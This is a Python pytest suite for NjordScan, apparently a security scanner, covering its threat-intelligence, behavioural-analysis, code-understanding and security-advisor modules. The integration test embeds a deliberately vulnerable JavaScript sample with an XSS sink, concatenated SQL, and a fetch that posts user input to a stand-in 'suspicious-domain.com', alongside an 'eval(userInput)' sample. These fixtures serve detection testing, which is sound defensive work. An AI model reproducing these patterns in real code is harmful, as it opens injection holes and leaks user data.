#!/usr/bin/env python3
"""
Test suite for NjordScan AI and Intelligence modules.
"""

import pytest
import sys
import os
import asyncio
from unittest.mock import patch, MagicMock

# Add the project root to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from njordscan.intelligence.threat_intelligence import ThreatIntelligenceEngine, ThreatIntelligenceConfig
from njordscan.intelligence.behavioral_analyzer import BehavioralAnalyzer, BehavioralAnalysisConfig
from njordscan.ai.code_understanding import CodeUnderstandingEngine
from njordscan.ai.security_advisor import SecurityAdvisor


class TestThreatIntelligence:
    """Test threat intelligence functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.config = ThreatIntelligenceConfig()
        self.engine = ThreatIntelligenceEngine(self.config)
    
    @pytest.mark.asyncio
    async def test_threat_intelligence_initialization(self):
        """Test threat intelligence engine initialization."""
        await self.engine.initialize()
        assert self.engine is not None
        assert hasattr(self.engine, 'check_indicators')
        assert hasattr(self.engine, 'get_threat_landscape')
    
    @pytest.mark.asyncio
    async def test_indicator_checking(self):
        """Test threat indicator checking."""
        await self.engine.initialize()
        
        # Test with benign content
        benign_content = "console.log('Hello World');"
        result = await self.engine.check_indicators(benign_content, "test.js")
        assert result is not None
        assert isinstance(result, list)
        
        # Test with potentially malicious content
        malicious_content = "eval(userInput);"
        result = await self.engine.check_indicators(malicious_content, "test.js")
        assert result is not None
        assert isinstance(result, list)
    
    @pytest.mark.asyncio
    async def test_threat_landscape_analysis(self):
        """Test threat landscape analysis."""
        await self.engine.initialize()
        
        result = await self.engine.get_threat_landscape(timeframe_days=30)
        assert result is not None
        assert 'summary' in result
        assert 'threat_distribution' in result
    
    @pytest.mark.asyncio
    async def test_custom_indicator_addition(self):
        """Test adding custom threat indicators."""
        await self.engine.initialize()
        
        from njordscan.intelligence.threat_intelligence import ThreatIndicator, IOCType, ThreatType, ThreatLevel
        
        indicator = ThreatIndicator(
            ioc_id="test_indicator",
            ioc_type=IOCType.PATTERN,
            value="test_pattern",
            threat_types={ThreatType.MALWARE},
            confidence=0.8,
            severity=ThreatLevel.MEDIUM,
            description="Test indicator"
        )
        
        result = await self.engine.add_custom_indicator(indicator)
        assert result == True
    
    def test_threat_intelligence_statistics(self):
        """Test threat intelligence statistics."""
        stats = self.engine.get_statistics()
        assert stats is not None
        assert 'total_indicators' in stats
        assert 'total_actors' in stats


class TestBehavioralAnalysis:
    """Test behavioral analysis functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.config = BehavioralAnalysisConfig()
        self.analyzer = BehavioralAnalyzer(self.config)
    
    @pytest.mark.asyncio
    async def test_behavioral_analyzer_initialization(self):
        """Test behavioral analyzer initialization."""
        await self.analyzer.initialize()
        assert self.analyzer is not None
        assert hasattr(self.analyzer, 'analyze_code_behavior')
        assert hasattr(self.analyzer, 'detect_apt_behavior')
    
    @pytest.mark.asyncio
    async def test_code_behavior_analysis(self):
        """Test code behavior analysis."""
        await self.analyzer.initialize()
        
        # Test with simple code
        simple_code = '''
        function hello() {
            console.log("Hello World");
        }
        hello();
        '''
        
        result = await self.analyzer.analyze_code_behavior("test.js", simple_code)
        assert result is not None
        assert 'file_path' in result
        assert 'events' in result
        assert 'sequences' in result
        assert 'anomalies' in result
    
    @pytest.mark.asyncio
    async def test_apt_behavior_detection(self):
        """Test APT behavior detection."""
        await self.analyzer.initialize()
        
        from njordscan.intelligence.behavioral_analyzer import BehaviorEvent
        
        # Create test events
        events = [
            BehaviorEvent(
                event_id="test1",
                event_type="function_call",
                timestamp=1234567890,
                source_location="test.js:1",
                function_name="eval",
                operation="call_function"
            ),
            BehaviorEvent(
                event_id="test2",
                event_type="network_call",
                timestamp=1234567891,
                source_location="test.js:2",
                function_name="fetch",
                operation="network_request"
            )
        ]
        
        result = await self.analyzer.detect_apt_behavior(events)
        assert result is not None
        assert 'overall_apt_score' in result
        assert 'threat_assessment' in result
    
    @pytest.mark.asyncio
    async def test_behavior_profile_generation(self):
        """Test behavior profile generation."""
        await self.analyzer.initialize()
        
        # First analyze some code to generate events
        test_code = '''
        function test() {
            var x = 1;
            var y = 2;
            return x + y;
        }
        '''
        
        await self.analyzer.analyze_code_behavior("test.js", test_code)
        
        # Get behavior profile
        profile = await self.analyzer.get_behavior_profile("test.js", "file")
        assert profile is not None
        assert 'target' in profile
        assert 'event_summary' in profile
    
    def test_behavioral_analyzer_statistics(self):
        """Test behavioral analyzer statistics."""
        stats = self.analyzer.get_statistics()
        assert stats is not None
        assert 'total_events' in stats
        assert 'total_sequences' in stats


class TestCodeUnderstanding:
    """Test code understanding functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.engine = CodeUnderstandingEngine()
    
    def test_code_understanding_initialization(self):
        """Test code understanding engine initialization."""
        assert self.engine is not None
        assert hasattr(self.engine, 'analyze_code')
        # Note: understand_context method doesn't exist, using analyze_code instead
    
    @pytest.mark.asyncio
    async def test_code_analysis(self):
        """Test code analysis functionality."""
        test_code = '''
        function calculateSum(a, b) {
            if (typeof a !== 'number' || typeof b !== 'number') {
                throw new Error('Invalid input');
            }
            return a + b;
        }
        '''
        
        result = await self.engine.analyze_code('test.js', test_code)
        assert result is not None
        assert hasattr(result, 'function_purposes')
        assert hasattr(result, 'complexity')
        assert hasattr(result, 'security_score')
    
    @pytest.mark.asyncio
    async def test_context_understanding(self):
        """Test context understanding functionality."""
        test_code = '''
        const express = require('express');
        const app = express();
        
        app.get('/api/users', (req, res) => {
            const userId = req.query.id;
            const user = getUserById(userId);
            res.json(user);
        });
        '''
        
        # Use analyze_code since understand_context doesn't exist
        result = await self.engine.analyze_code('server.js', test_code)
        assert result is not None
        assert hasattr(result, 'function_purposes')
        assert hasattr(result, 'complexity')
        assert hasattr(result, 'security_score')


class TestSecurityAdvisor:
    """Test security advisor functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.advisor = SecurityAdvisor()
    
    def test_security_advisor_initialization(self):
        """Test security advisor initialization."""
        assert self.advisor is not None
        assert hasattr(self.advisor, 'generate_recommendations')
        # Note: analyze_security and provide_recommendations don't exist
    
    @pytest.mark.asyncio
    async def test_security_analysis(self):
        """Test security analysis functionality."""
        test_data = {
            'vulnerabilities': [
                {'type': 'XSS', 'severity': 'high', 'location': 'line 10'},
                {'type': 'SQL Injection', 'severity': 'critical', 'location': 'line 25'}
            ],
            'dependencies': [
                {'name': 'express', 'version': '4.18.0', 'vulnerabilities': []},
                {'name': 'lodash', 'version': '4.17.21', 'vulnerabilities': []}
            ]
        }
        
        # Use generate_recommendations since analyze_security doesn't exist
        result = await self.advisor.generate_recommendations(test_data)
        assert result is not None
        assert hasattr(result, 'recommendations')
        assert hasattr(result, 'strategy')
    
    @pytest.mark.asyncio
    async def test_security_recommendations(self):
        """Test security recommendations functionality."""
        test_data = {
            'vulnerabilities': [
                {'type': 'XSS', 'severity': 'high'},
                {'type': 'CSRF', 'severity': 'medium'}
            ]
        }
        
        result = await self.advisor.generate_recommendations(test_data)
        assert result is not None
        assert hasattr(result, 'recommendations')
        assert len(result) > 0


class TestIntegration:
    """Test AI and Intelligence integration."""
    
    @pytest.mark.asyncio
    async def test_ai_intelligence_workflow(self):
        """Test complete AI and Intelligence workflow."""
        # Initialize components
        threat_engine = ThreatIntelligenceEngine()
        behavioral_analyzer = BehavioralAnalyzer()
        code_engine = CodeUnderstandingEngine()
        security_advisor = SecurityAdvisor()
        
        await threat_engine.initialize()
        await behavioral_analyzer.initialize()
        
        # Test code with potential issues
        test_code = '''
        function processUserData(userInput) {
            // Potential XSS vulnerability
            document.getElementById('output').innerHTML = userInput;
            
            // Potential SQL injection
            const query = "SELECT * FROM users WHERE id = " + userInput;
            database.execute(query);
            
            // Suspicious network call
            fetch('http://suspicious-domain.com/data', {
                method: 'POST',
                body: JSON.stringify({data: userInput})
            });
        }
        '''
        
        # Run analysis pipeline
        # 1. Code understanding
        code_analysis = await code_engine.analyze_code('test.js', test_code)
        
        # 2. Threat intelligence
        threat_indicators = await threat_engine.check_indicators(test_code, 'test.js')
        
        # 3. Behavioral analysis
        behavior_analysis = await behavioral_analyzer.analyze_code_behavior('test.js', test_code)
        
        # 4. Security advisory
        security_data = {
            'vulnerabilities': code_analysis.get('security_concerns', []),
            'threat_indicators': threat_indicators,
            'behavioral_anomalies': behavior_analysis.get('anomalies', [])
        }
        security_analysis = await security_advisor.generate_recommendations(security_data)
        
        # Verify results
        assert code_analysis is not None
        assert threat_indicators is not None
        assert behavior_analysis is not None
        assert security_analysis is not None
        
        # Should detect security issues
        assert len(code_analysis.get('security_concerns', [])) > 0
        assert security_analysis.get('risk_score', 0) > 0
    
    @pytest.mark.asyncio
    async def test_error_handling(self):
        """Test error handling in AI and Intelligence modules."""
        # Test with invalid input
        threat_engine = ThreatIntelligenceEngine()
        await threat_engine.initialize()
        
        # Should handle None input gracefully
        result = await threat_engine.check_indicators(None, "")
        assert result is not None
        assert isinstance(result, list)
        
        # Test with empty input
        result = await threat_engine.check_indicators("", "")
        assert result is not None
        assert isinstance(result, list)


if __name__ == '__main__':
    pytest.main([__file__])
